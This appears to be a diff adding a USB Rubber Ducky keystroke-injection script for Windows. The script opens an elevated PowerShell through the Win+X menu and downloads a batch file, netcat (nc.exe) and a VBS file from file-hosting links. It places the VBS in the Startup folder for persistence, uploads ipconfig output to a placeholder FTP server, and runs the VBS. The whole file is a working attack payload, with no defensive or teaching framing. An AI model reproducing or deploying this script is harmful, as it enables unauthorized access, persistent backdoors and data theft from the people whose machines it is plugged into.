@@ -1,0 +1,83 @@
+GUI x
+DELAY 100
+UP
+DELAY 100
+UP
+DELAY 100
+UP
+DELAY 100
+UP
+DELAY 100
+UP
+DELAY 100
+UP
+DELAY 100
+UP
+DELAY 100
+UP
+DELAY 100
+ENTER
+DELAY 1000
+LEFT
+DELAY 100
+ENTER
+DELAY 3500
+STRING $us = $env:userprofile
+DELAY 100
+ENTER
+DELAY 100
+STRING $st = $env:appdata + "\Microsoft\Windows\Start Menu\Programs\Startup\"
+DELAY 100
+ENTER
+DELAY 100
+STRING $client = new-object System.Net.WebClient
+DELAY 100
+ENTER
+DELAY 100
+STRING $client.DownloadFile("https://download1497.mediafire.com/8m313dl9bqqg/kluwkdgi8v6dovl/b.bat","$us\b.bat")
+DELAY 100
+ENTER
+DELAY 4000
+STRING $client.DownloadFile("https://download1585.mediafire.com/25w5mwh6g4kg/ncd5kz7z6bv0bsa/nc.exe","$us\nc.exe")
+DELAY 100
+ENTER
+DELAY 4000
+STRING $client.DownloadFile("https://download1338.mediafire.com/gvrx9wxzrjzg/ohgvexnnc6axq1d/e.vbs","$st\e.vbs")
+DELAY 100
+ENTER
+DELAY 4000
+STRING cd C:\
+DELAY 100
+ENTER
+DELAY 1000
+STRING ipconfig > a.txt
+DELAY 100
+ENTER
+DELAY 1000
+STRING ftp <HOST_FTP>
+DELAY 100
+ENTER
+DELAY 3000
+STRING <USUARIO_FTP>
+DELAY 100
+ENTER
+DELAY 3000
+STRING <CONTRASEÑA_FTP>
+DELAY 100
+ENTER
+DELAY 3000
+STRING put a.txt
+DELAY 100
+ENTER
+DELAY 3000
+STRING bye
+DELAY 100
+ENTER
+DELAY 1000
+STRING start $st\e.vbs
+DELAY 100
+ENTER
+DELAY 1000
+STRING exit
+DELAY 100
+ENTER
